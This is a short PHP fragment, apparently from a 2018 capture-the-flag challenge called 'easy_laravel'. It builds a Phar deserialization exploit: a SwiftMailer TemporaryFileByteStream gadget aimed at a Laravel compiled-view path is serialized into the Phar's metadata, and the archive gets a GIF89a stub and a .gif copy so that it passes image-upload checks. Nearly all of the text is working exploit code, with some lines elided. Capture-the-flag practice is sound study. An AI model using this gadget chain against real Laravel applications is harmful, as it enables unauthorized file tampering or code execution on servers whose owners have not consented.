...
class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream {
	public function __construct() {
		...
		// $filePath = '/Users/virink/Playground/2018/huwangbei/easy_laravel/storage/framework/views/123';
...
echo serialize($obj);
$p = new Phar('./easy_laravel_exp.phar', 0);
$p->startBuffering();
$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
$p->setMetadata($obj);
$p->addFromString('v.txt', 'text');
$p->stopBuffering();
copy('./easy_laravel_exp.phar', 'easy_laravel_exp.gif');
?>